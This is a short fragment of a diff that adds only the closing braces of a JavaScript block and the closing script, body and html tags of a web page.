+        }
+    });
+  </script>
+ </body>
+</html>
